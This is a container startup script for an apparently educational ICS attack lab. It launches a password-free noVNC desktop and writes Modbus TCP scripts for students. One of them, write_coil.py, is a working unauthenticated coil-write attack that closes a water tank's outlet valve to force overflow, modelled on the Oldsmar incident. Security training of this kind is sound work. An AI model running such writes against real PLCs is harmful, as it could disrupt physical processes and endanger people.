#!/bin/bash
# entrypoint.sh — Kali attack machine container startup
#
# Startup sequence:
#   1. Print device identity and available tools
#   2. Start TigerVNC server on display :1 (port 5901)
#      TigerVNC automatically runs ~/.config/tigervnc/xstartup, which calls
#      dbus-launch --exit-with-session startxfce4. No separate Xfce4 launch needed.
#   3. Wait for VNC socket + TCP readiness (nc probes) before starting websockify
#   4. Start websockify to bridge noVNC WebSocket (port 6080) → VNC TCP (5901)
#   5. Keep the container alive for docker exec terminal sessions
#
# Port map:
#   5901  — VNC TCP (internal; not published to host)
#   6080  — noVNC WebSocket (published to host via Docker Compose port mapping)
#           Accessible in the Electron Desktop view at http://localhost:<hostPort>/vnc.html

set -e

echo "[otforge-attack] =============================================="
echo "[otforge-attack] Device:   ${DEVICE_ID}"
echo "[otforge-attack] Category: ${DEVICE_CATEGORY}"
echo "[otforge-attack] Zone:     External network (attacker-controlled)"
echo "[otforge-attack] =============================================="
echo ""
echo "[otforge-attack] CLI Tools:     nmap, masscan, netcat, tshark, scapy, pymodbus"
echo "[otforge-attack] Frameworks:    metasploit-framework, armitage"
echo "[otforge-attack] Passwords:     hydra, medusa, john, hashcat"
echo "[otforge-attack] ICS Protocol:  pymodbus, dnp3-python, opcua, bacpypes3, python-snap7"
echo "[otforge-attack] Desktop:       Xfce4 via noVNC at container port 6080"
echo "[otforge-attack]                (Wireshark GUI, Armitage, Firefox available)"
echo ""

# ── Network interface report + route repair ───────────────────────────────────
echo "[otforge-attack] Network interfaces:"
ip addr show
echo ""

# On Docker Desktop for Windows, subnet routes for secondary (non-default) network
# interfaces are sometimes absent from the routing table, especially for bridge
# networks created with 'internal: true'. Without these routes, traffic to the
# internet-dmz or ot subnets is sent via the default route (attacker-net) and
# returns EHOSTUNREACH because those hosts are not reachable from that bridge.
#
# Fix: iterate every eth* interface, derive its /24 subnet, and add an explicit
# 'scope link' route for that subnet if one is not already present.
echo "[otforge-attack] Verifying subnet routes for all interfaces..."
for IFACE in $(ip -o link show | awk -F': ' '{print $2}' | grep '^eth'); do
    ADDR=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet /{print $2}' | head -1)
    [ -z "$ADDR" ] && continue
    # Derive network/prefix from the assigned address (e.g., 10.200.50.250/24 → 10.200.50.0/24)
    NETWORK=$(python3 -c "
import ipaddress, sys
try:
    iface = ipaddress.ip_interface('$ADDR')
    print(str(iface.network))
except Exception:
    sys.exit(1)
" 2>/dev/null) || continue
    if ip route show dev "$IFACE" 2>/dev/null | grep -qF "$NETWORK"; then
        echo "[otforge-attack]   $IFACE  $NETWORK  (route OK)"
    else
        ip route add "$NETWORK" dev "$IFACE" 2>/dev/null && \
            echo "[otforge-attack]   $IFACE  $NETWORK  (route ADDED)" || \
            echo "[otforge-attack]   $IFACE  $NETWORK  (route add failed — may need NET_ADMIN)"
    fi
done
echo ""

# ── Start TigerVNC server ─────────────────────────────────────────────────────
echo "[otforge-attack] Starting TigerVNC server on display :1 (port 5901)..."

# Clean up any stale lock files from a previous unclean shutdown
rm -f /tmp/.X1-lock /tmp/.X11-unix/X1 2>/dev/null || true

# Geometry matches a standard 16:9 monitor — suitable for Wireshark's layout.
# -SecurityTypes None: password-free VNC — safe because port 5901 is not
#   published to the host; VNC is only reachable via websockify on port 6080.
# -localhost yes: bind VNC to 127.0.0.1 only (not all interfaces) so that newer
#   TigerVNC versions do NOT reject the start-up. websockify connects to
#   localhost:5901, so binding to loopback is sufficient. Using -localhost no with
#   -SecurityTypes None causes TigerVNC ≥ 1.14 to refuse with a security error.
vncserver :1 \
    -geometry 1920x1080 \
    -depth 24 \
    -localhost yes \
    -SecurityTypes None \
    -fg &
VNC_PID=$!

# Wait for VNC socket to appear before starting websockify
for i in $(seq 1 15); do
    if [ -S /tmp/.X11-unix/X1 ] || ss -tln | grep -q ':5901'; then
        echo "[otforge-attack] VNC server ready (attempt ${i})"
        break
    fi
    sleep 1
done

# ── Xfce4 is launched via VNC xstartup, not here ─────────────────────────────
# TigerVNC automatically executes ~/.config/tigervnc/xstartup after creating the
# X session. That script runs `dbus-launch --exit-with-session startxfce4`, which
# is the correct single launch path.
#
# We deliberately do NOT start startxfce4 here. A second call would start a second
# Xfce4 instance on the same display — its xfwm4 would fail with "Another Window
# Manager is already running", leaving the desktop without titlebars and resize handles.

# Wait for TigerVNC to actually accept TCP connections on port 5901 before starting
# websockify. The socket-file / port check above confirmed VNC started, but there is
# a brief window where TigerVNC has the socket open but rejects incoming connections
# while it finishes initialising the X session. A TCP connection probe is more
# reliable than a sleep-based heuristic.
echo "[otforge-attack] Waiting for VNC to accept TCP connections on port 5901..."
for i in $(seq 1 20); do
    # Try a TCP connection; nc exits 0 immediately on success, 1 on refused/timeout
    if nc -z -w1 localhost 5901 2>/dev/null; then
        echo "[otforge-attack] VNC accepting connections (attempt ${i})"
        break
    fi
    sleep 1
done

# ── Start noVNC WebSocket bridge ─────────────────────────────────────────────
# websockify translates WebSocket frames from the Electron BrowserWindow (noVNC page)
# into raw VNC TCP frames that TigerVNC understands. The --wrap-mode=ignore flag
# prevents websockify from exiting when the VNC connection drops (e.g. client refresh).
echo "[otforge-attack] Starting noVNC websockify bridge on port 6080..."
websockify \
    --web /opt/novnc/ \
    --wrap-mode=ignore \
    0.0.0.0:6080 \
    localhost:5901 &
NOVNC_PID=$!

# Verify websockify is listening on port 6080 before declaring the container ready.
# Without this check the host-side isPortOpen() probe may succeed while websockify
# is still in its startup phase and the WebSocket handshake fails.
echo "[otforge-attack] Waiting for noVNC websockify to listen on port 6080..."
for i in $(seq 1 15); do
    if nc -z -w1 localhost 6080 2>/dev/null; then
        echo "[otforge-attack] noVNC ready on port 6080 (attempt ${i})"
        break
    fi
    sleep 1
done

echo "[otforge-attack] Desktop ready — connect at container port 6080"
echo "[otforge-attack] VNC: no password required (SecurityTypes None; isolated within Docker network)"
echo ""
echo "[otforge-attack] Waiting for terminal sessions (docker exec)..."

# ── Create Attack_Scripts desktop directory ───────────────────────────────────
# Populate /root/Desktop/Attack_Scripts/ with ready-to-run pymodbus scripts so
# students can immediately interact with the PLC without writing any code.
# PLC_IP and PLC_PORT are injected by compose-generator.ts from the scenario's
# first PLC device; scripts read them from the environment at runtime.

mkdir -p /root/Desktop/Attack_Scripts

# ── Shared raw-socket Modbus helpers ─────────────────────────────────────────
# All four attack scripts use raw Python sockets instead of pymodbus. This
# avoids pymodbus 3.x strict Transaction-ID validation, which rejects OpenPLC
# responses because OpenPLC echoes TID=0 regardless of the request TID.  Raw
# sockets send TID=0 and accept whatever the server returns, matching OTForge's
# own Modbus implementation in the main process.
#
# Each function opens its own short-lived TCP connection so there is no
# persistent connection state that can desynchronise between calls.
#
# Modbus TCP address map for Tutorial 01 (pump_control.st):
#   FC01/FC05  Coil 0   pump_run    %QX0.0  — inlet pump   (TRUE = running)
#   FC01/FC05  Coil 1   valve_open  %QX0.1  — outlet valve (TRUE = open)
#   FC01/FC05  Coil 2   emrg_stop   %QX0.2  — emergency stop
#   FC03/FC06  HR 1024  tank_level  %MW0    — tank level in cm (0–1000)
#   FC03       HR 1025  inlet_flow  %MW1    — inlet flow L/min
#   FC03       HR 1026  outlet_flow %MW2    — outlet flow L/min
#
# Attack goal: write Coil 1 (valve_open) → FALSE to CLOSE the outlet drain.
# With the inlet pump still running, inflow > 0 and outflow = 0 → tank fills.

# ── read_coils.py ─────────────────────────────────────────────────────────────
cat > /root/Desktop/Attack_Scripts/read_coils.py << 'PYEOF'
#!/usr/bin/env python3
"""
read_coils.py — Read PLC coil and holding-register state via raw Modbus TCP.

Usage:
    python3 read_coils.py

Environment variables (injected automatically by the OTForge simulation):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)

Coil map (Tutorial 01 — pump_control program):
    Coil 0  pump_run     FALSE=inlet pump OFF,    TRUE=inlet pump ON
    Coil 1  valve_open   FALSE=outlet valve CLOSED, TRUE=outlet valve OPEN
    Coil 2  emrg_stop    FALSE=normal,             TRUE=emergency stop tripped

Holding register map (OpenPLC %MW memory words start at Modbus HR address 1024):
    HR 1024  tank_level   Tank fill level in cm  (500=5.00 m, 1000=10.00 m = overflow)
    HR 1025  inlet_flow   Inlet flow rate in L/min  (>0 when inlet pump is running)
    HR 1026  outlet_flow  Outlet flow rate in L/min (>0 when outlet valve is open)
"""

import os, sys, socket, struct

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

COIL_LABELS = {
    0: 'pump_run    (inlet pump)',
    1: 'valve_open  (outlet valve)',
    2: 'emrg_stop   (emergency stop)',
}
REG_LABELS = {
    0: 'tank_level   (cm)',
    1: 'inlet_flow   (L/min)',
    2: 'outlet_flow  (L/min)',
}

# ── Raw Modbus TCP helpers ────────────────────────────────────────────────────
def _mb_req(ip, port, pdu_body, unit=1):
    """Open a fresh TCP connection, send one Modbus TCP frame, return response bytes."""
    pdu   = bytes([unit]) + pdu_body
    frame = struct.pack('>HHH', 0, 0, len(pdu)) + pdu  # TID=0, Proto=0, Length
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(frame)
            return s.recv(256)
    except OSError as e:
        print(f"[error] socket error: {e}")
        return b''

def read_coils(ip, port, start, count, unit=1):
    pdu  = struct.pack('>BHH', 0x01, start, count)
    resp = _mb_req(ip, port, pdu, unit)
    # Response: MBAP(6) + Unit(1) + FC(1) + ByteCount(1) + data
    need = 9 + (count + 7) // 8
    if len(resp) < need or resp[7] != 0x01:
        return None
    bits = []
    for i in range(count):
        bits.append(bool((resp[9 + i // 8] >> (i % 8)) & 1))
    return bits

def read_holding_registers(ip, port, start, count, unit=1):
    pdu  = struct.pack('>BHH', 0x03, start, count)
    resp = _mb_req(ip, port, pdu, unit)
    need = 9 + count * 2
    if len(resp) < need or resp[7] != 0x03:
        return None
    return list(struct.unpack_from(f'>{count}H', resp, 9))

# ── FC01: Read Coils 0–2 ──────────────────────────────────────────────────────
print(f"[*] Connecting to PLC at {PLC_IP}:{PLC_PORT} ...")

coils = read_coils(PLC_IP, PLC_PORT, start=0, count=3)
if coils is None:
    print("[error] FC01 Read Coils failed — is the simulation running?")
    sys.exit(1)

print(f"[+] Connected\n")
print("=== COILS  (Modbus FC01 — Read Coils) ===")
for idx, state in enumerate(coils):
    label  = COIL_LABELS.get(idx, f'coil_{idx}')
    marker = "ON  (TRUE) " if state else "OFF (FALSE)"
    print(f"  Coil {idx}  {label:<35} {marker}")

print()

# ── FC03: Read Holding Registers 1024–1026 (%MW0–%MW2) ───────────────────────
print("=== HOLDING REGISTERS  (Modbus FC03 — Read Holding Registers) ===")
regs = read_holding_registers(PLC_IP, PLC_PORT, start=1024, count=3)
if regs is None:
    print("[error] FC03 Read Holding Registers failed")
    sys.exit(1)

for idx, raw in enumerate(regs):
    label   = REG_LABELS.get(idx, f'reg_{idx}')
    display = f"{raw} cm  ({raw / 100.0:.2f} m)" if idx == 0 else str(raw)
    print(f"  HR{1024+idx}  {label:<35} {display}")

print()
print("[+] Done — no writes performed")
PYEOF

# ── write_coil.py ─────────────────────────────────────────────────────────────
# Default (no args): ATTACK — closes the outlet valve (Coil 1 → FALSE).
#   With the inlet pump still running (Coil 0 = TRUE), inflow > outflow and
#   the tank level rises.  Watch HR 1024 climb and the Water Tank canvas
#   animation fill up.
#
# --restore: re-opens the outlet valve (Coil 1 → TRUE).
#   Inlet pump is left untouched.  Inflow = outflow → level stabilises.
#
# Uses raw TCP sockets (no pymodbus) to avoid TID-validation errors that
# appear with some pymodbus 3.x versions against OpenPLC.
cat > /root/Desktop/Attack_Scripts/write_coil.py << 'PYEOF'
#!/usr/bin/env python3
"""
write_coil.py — Modbus coil write attack against the Tutorial 01 water treatment PLC.

Default action  (no flags):  ATTACK  — close the outlet valve (Coil 1 → FALSE).
                              The inlet pump keeps running, so water flows in with
                              no path out.  The PLC physics loop accumulates the
                              level — watch HR 1024 (tank_level) rise in the OT
                              canvas animation and in the terminal progress bar.

With --restore:              RESTORE — re-open the outlet valve (Coil 1 → TRUE).
                              Inlet pump is not touched; with both pump and valve
                              TRUE, inflow = outflow and the level stabilises.
                              Run plc_init.py to reset the level to 500 cm.

This replicates the 2021 Oldsmar, Florida water treatment attack technique:
Modbus TCP carries no authentication — any host on the OT network can write
any coil or register on any PLC with zero credentials required.

Usage:
    python3 write_coil.py           # execute attack → watch tank rise
    python3 write_coil.py --restore # restore safe state

Environment variables (injected automatically by the OTForge simulation):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)
"""

import os, sys, socket, struct, time

RESTORE_MODE = '--restore' in sys.argv

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

# ── Raw Modbus TCP helpers ────────────────────────────────────────────────────
def _mb_req(ip, port, pdu_body, unit=1):
    """Send one Modbus TCP frame on a fresh connection; return response bytes."""
    pdu   = bytes([unit]) + pdu_body
    frame = struct.pack('>HHH', 0, 0, len(pdu)) + pdu
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(frame)
            return s.recv(256)
    except OSError:
        return b''

def write_coil(ip, port, address, value, unit=1):
    """FC05: Write Single Coil. Returns True on ACK."""
    pdu  = struct.pack('>BHH', 0x05, address, 0xFF00 if value else 0x0000)
    resp = _mb_req(ip, port, pdu, unit)
    return len(resp) >= 8 and resp[7] == 0x05

def read_register(ip, port, address, unit=1):
    """FC03: Read one Holding Register. Returns int value or None on error."""
    pdu  = struct.pack('>BHH', 0x03, address, 1)
    resp = _mb_req(ip, port, pdu, unit)
    if len(resp) < 11 or resp[7] != 0x03:
        return None
    return struct.unpack_from('>H', resp, 9)[0]

# ── Mode / target summary ─────────────────────────────────────────────────────
if RESTORE_MODE:
    VALVE_STATE = True
    mode_label  = "RESTORE — re-open outlet valve (inlet pump not touched)"
else:
    VALVE_STATE = False
    mode_label  = "ATTACK  — outlet valve CLOSED (tank overflow via physics sim)"

print(f"[*] Mode:      {mode_label}")
print(f"[*] Target:    {PLC_IP}:{PLC_PORT}")
print(f"[*] Coil 1 (valve_open) → {'TRUE  (valve OPEN)'  if VALVE_STATE else 'FALSE (valve CLOSED)'}")
print()

# ── FC05: Write Coil 1 (valve_open) ──────────────────────────────────────────
# ATTACK:  valve_open → FALSE closes the outlet drain.
#          Inlet pump keeps running (Coil 0 = TRUE, unchanged).
#          inlet_flow = 120 L/min, outlet_flow = 0 → level rises 5 cm/scan.
#
# RESTORE: valve_open → TRUE re-opens the outlet drain.
#          inlet_flow = outlet_flow = 120 → balanced → level stabilises.
print(f"[*] Sending Modbus FC05 (Write Single Coil) to {PLC_IP}:{PLC_PORT} ...")
if not write_coil(PLC_IP, PLC_PORT, address=1, value=VALVE_STATE):
    print("[error] FC05 write failed — is the simulation running?")
    sys.exit(1)

state_str = "TRUE  (OPEN)  " if VALVE_STATE else "FALSE (CLOSED)"
print(f"[+] Coil 1 (valve_open) → {state_str} — FC05 ACK'd\n")

# ── Progress bar helper ───────────────────────────────────────────────────────
def _bar(level):
    lvl = max(0, min(level, 1000))
    pct = lvl / 10.0
    n   = int(pct / 5)
    bar = '█' * n + '░' * (20 - n)
    if   pct < 50:  tag = "NORMAL  "
    elif pct < 80:  tag = "ELEVATED"
    elif pct < 100: tag = "CRITICAL"
    else:           tag = "OVERFLOW"
    return f"  [{bar}] {lvl:4d} cm  ({pct:5.1f}%)  {tag}"

if not RESTORE_MODE:
    # ── ATTACK mode — monitor rising level ───────────────────────────────────
    print("[+] ATTACK COMPLETE — PLC is now in an unsafe state.")
    print("    Coil 1 = FALSE (outlet valve CLOSED)  |  Coil 0 = TRUE (inlet pump ON)")
    print("    Water is accumulating — overflow at 1000 cm (approx. 5 min).")
    print("    To restore:  python3 write_coil.py --restore")
    print()
    print("[*] Monitoring HR 1024 (tank_level) — watch it rise.")
    print("[*] The Water Tank icon on the OT canvas also animates the fill level.")
    print("[*] Press Ctrl+C to stop monitoring (attack stays active).\n")
    try:
        while True:
            lvl = read_register(PLC_IP, PLC_PORT, address=1024)
            if lvl is not None:
                lvl = min(lvl, 1000)
                print(f"\r{_bar(lvl)}", end='', flush=True)
                if lvl >= 1000:
                    print("\n")
                    print("[!] OVERFLOW — tank at 1000 cm (10.00 m)!")
                    print("[!] Run  python3 write_coil.py --restore  to recover.")
                    break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print()
        print("[*] Monitoring stopped — attack is still active.")
else:
    # ── RESTORE mode ─────────────────────────────────────────────────────────
    print("[+] Outlet valve restored to OPEN.")
    print("    Coil 1 = TRUE (outlet valve OPEN)  |  Coil 0 unchanged (inlet pump ON)")
    lvl = read_register(PLC_IP, PLC_PORT, address=1024)
    if lvl is not None:
        print(f"\n[*] Current tank_level: {lvl} cm")
        print(f"[*] {_bar(lvl)}")
    print()
    print("[*] Flow is balanced — level will stabilise at its current value.")
    print("[*] To reset tank to 500 cm baseline:  python3 plc_init.py")
PYEOF

chmod +x /root/Desktop/Attack_Scripts/read_coils.py
chmod +x /root/Desktop/Attack_Scripts/write_coil.py

# ── plc_init.py ────────────────────────────────────────────────────────────────
# Seeds the PLC to its safe operating baseline via raw Modbus TCP.
# Called automatically in the background at container start, and available
# manually from the Kali Desktop after an attack to reset without restarting.
#
# Baseline state:
#   Coil 0 (pump_run)   → TRUE  — inlet pump ON
#   Coil 1 (valve_open) → TRUE  — outlet valve OPEN
#   HR 1024 (tank_level) → 500  — tank at 50% (5.00 m)
#
# With both coils TRUE, inlet_flow = outlet_flow = 120 L/min → balanced →
# tank_level stays stable at 500 cm. Writing HR 1024 = 500 directly resets
# the displayed level without restarting the simulation.
cat > /root/Desktop/Attack_Scripts/plc_init.py << 'PYEOF'
#!/usr/bin/env python3
"""
plc_init.py — Seed the PLC to its safe operating baseline via raw Modbus TCP.

Called automatically at container start; also available for manual re-seeding
after an attack without restarting the full simulation.

Writes:
  Coil 0 (pump_run)    → TRUE   inlet pump ON   (%QX0.0)
  Coil 1 (valve_open)  → TRUE   outlet valve OPEN (%QX0.1)
  HR 1024 (tank_level) → 500    tank at 50% baseline (%MW0)

With pump_run=TRUE and valve_open=TRUE the flow is balanced (inlet=outlet=120
L/min) so tank_level stays at 500 cm until the attack writes valve_open=FALSE.

Environment variables (injected automatically by OTForge):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)
"""

import os, sys, socket, struct

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))

def _mb_req(ip, port, pdu_body, unit=1):
    pdu   = bytes([unit]) + pdu_body
    frame = struct.pack('>HHH', 0, 0, len(pdu)) + pdu
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(frame)
            return s.recv(256)
    except OSError:
        return b''

def write_coil(ip, port, address, value, unit=1):
    pdu  = struct.pack('>BHH', 0x05, address, 0xFF00 if value else 0x0000)
    resp = _mb_req(ip, port, pdu, unit)
    return len(resp) >= 8 and resp[7] == 0x05

def write_register(ip, port, address, value, unit=1):
    """FC06: Write Single Register."""
    pdu  = struct.pack('>BHH', 0x06, address, value)
    resp = _mb_req(ip, port, pdu, unit)
    return len(resp) >= 8 and resp[7] == 0x06

success = True

# ── Coil 0: pump_run → TRUE (inlet pump ON) ──────────────────────────────────
if write_coil(PLC_IP, PLC_PORT, address=0, value=True):
    print("[plc-init] Coil 0 (pump_run)    → TRUE  (inlet pump ON)")
else:
    print(f"[plc-init] write_coil(0) failed — PLC at {PLC_IP}:{PLC_PORT} not responding")
    success = False

# ── Coil 1: valve_open → TRUE (outlet valve OPEN) ────────────────────────────
if write_coil(PLC_IP, PLC_PORT, address=1, value=True):
    print("[plc-init] Coil 1 (valve_open)  → TRUE  (outlet valve OPEN)")
else:
    print(f"[plc-init] write_coil(1) failed")
    success = False

# ── HR 1024: tank_level → 500 (50% baseline) ──────────────────────────────────
# OpenPLC %MW0 → Modbus HR 1024 (MIN_16B_RANGE = 1024 in modbus.cpp).
if write_register(PLC_IP, PLC_PORT, address=1024, value=500):
    print("[plc-init] HR 1024 (tank_level) → 500   (50% baseline, 5.00 m)")
else:
    print(f"[plc-init] write_register(1024) failed")
    success = False

if success:
    print("[plc-init] PLC baseline state seeded successfully.")
    sys.exit(0)
else:
    print("[plc-init] One or more writes failed — baseline may be incomplete.")
    sys.exit(1)
PYEOF

chmod +x /root/Desktop/Attack_Scripts/plc_init.py

# ── monitor_level.py ──────────────────────────────────────────────────────────
# Live ASCII bar graph of HR 1024 (tank_level). Run in a second terminal
# alongside write_coil.py to watch the level rise numerically.
cat > /root/Desktop/Attack_Scripts/monitor_level.py << 'PYEOF'
#!/usr/bin/env python3
"""
monitor_level.py — Live tank-level monitor using raw Modbus TCP.

Polls HR 1024 (%MW0 = tank_level), HR 1025 (inlet_flow), and HR 1026
(outlet_flow) every second and prints a continuously-updating ASCII bar.

Usage:
    python3 monitor_level.py           # poll every 1 s (default)
    python3 monitor_level.py --fast    # poll every 0.5 s
    Press Ctrl+C to stop.

Environment variables (injected automatically by OTForge):
    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
    PLC_PORT  Modbus TCP port               (default: 502)
"""

import os, sys, socket, struct, time

PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
PLC_PORT = int(os.environ.get('PLC_PORT', '502'))
INTERVAL = 0.5 if '--fast' in sys.argv else 1.0

def _mb_req(ip, port, pdu_body, unit=1):
    pdu   = bytes([unit]) + pdu_body
    frame = struct.pack('>HHH', 0, 0, len(pdu)) + pdu
    try:
        with socket.create_connection((ip, port), timeout=5) as s:
            s.sendall(frame)
            return s.recv(256)
    except OSError:
        return b''

def read_registers(ip, port, start, count, unit=1):
    pdu  = struct.pack('>BHH', 0x03, start, count)
    resp = _mb_req(ip, port, pdu, unit)
    if len(resp) < 9 + count * 2 or resp[7] != 0x03:
        return None
    return list(struct.unpack_from(f'>{count}H', resp, 9))

print(f"[*] Connecting to {PLC_IP}:{PLC_PORT} — polling HR 1024–1026 every {INTERVAL:.1f} s")
print(f"[*] Press Ctrl+C to stop.\n")
print(f"  {'LEVEL BAR':^42}  LEVEL    PCT    IN     OUT    STATUS")
print(f"  {'─'*42}  {'─'*6}  {'─'*5}  {'─'*6}  {'─'*6}  {'─'*8}")

try:
    while True:
        regs = read_registers(PLC_IP, PLC_PORT, start=1024, count=3)
        if regs:
            lvl    = min(regs[0], 1000)
            q_in   = regs[1]
            q_out  = regs[2]
            pct    = lvl / 10.0
            n      = int(pct / 5)
            bar    = '█' * n + '░' * (20 - n)
            status = ("NORMAL  " if pct < 50 else
                      "ELEVATED" if pct < 80 else
                      "CRITICAL" if pct < 100 else "OVERFLOW")
            print(f"\r  [{bar}]  {lvl:4d}cm  {pct:5.1f}%  "
                  f"{q_in:5d}  {q_out:5d}  {status}", end='', flush=True)
        else:
            print("\r  [no response — is the simulation running?]", end='', flush=True)
        time.sleep(INTERVAL)
except KeyboardInterrupt:
    print("\n[*] Monitoring stopped.")
PYEOF

chmod +x /root/Desktop/Attack_Scripts/monitor_level.py

echo "[otforge-attack] Attack_Scripts created:"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py    — read coil + register state (one-shot)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py    — coil write attack (--restore to undo)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py      — re-seed PLC baseline (inlet pump=ON, outlet valve=OPEN)"
echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py — live tank-level bar (--fast for 0.5 s poll)"

# ── PLC Modbus baseline initialization ────────────────────────────────────────
# Runs in the background so VNC/noVNC startup is not delayed.
# Polls PLC_IP:PLC_PORT every 2 s for up to 30 s, then writes the baseline
# state once the PLC's Modbus listener is accepting connections.
# This is necessary because OpenPLC zeros all AT-mapped I/O at container start,
# overriding any initial values in the ST program.
(
    _PLC_IP="${PLC_IP:-10.200.10.10}"
    _PLC_PORT="${PLC_PORT:-502}"
    echo "[otforge-attack] [plc-init] Waiting for PLC at ${_PLC_IP}:${_PLC_PORT}..."
    for i in $(seq 1 15); do
        if nc -z -w1 "${_PLC_IP}" "${_PLC_PORT}" 2>/dev/null; then
            echo "[otforge-attack] [plc-init] PLC reachable (attempt ${i}) — seeding baseline..."
            python3 /root/Desktop/Attack_Scripts/plc_init.py
            exit $?
        fi
        echo "[otforge-attack] [plc-init] Not reachable yet (attempt ${i}/15) — waiting 2 s..."
        sleep 2
    done
    echo "[otforge-attack] [plc-init] PLC did not become reachable within 30 s — skipping baseline seed."
    exit 1
) &

# ── Keep container alive ──────────────────────────────────────────────────────
# The Electron xterm.js terminal attaches via `docker exec -i <name> /bin/bash`.
# The process here just holds the container open; exec sessions are independent.
exec tail -f /dev/null
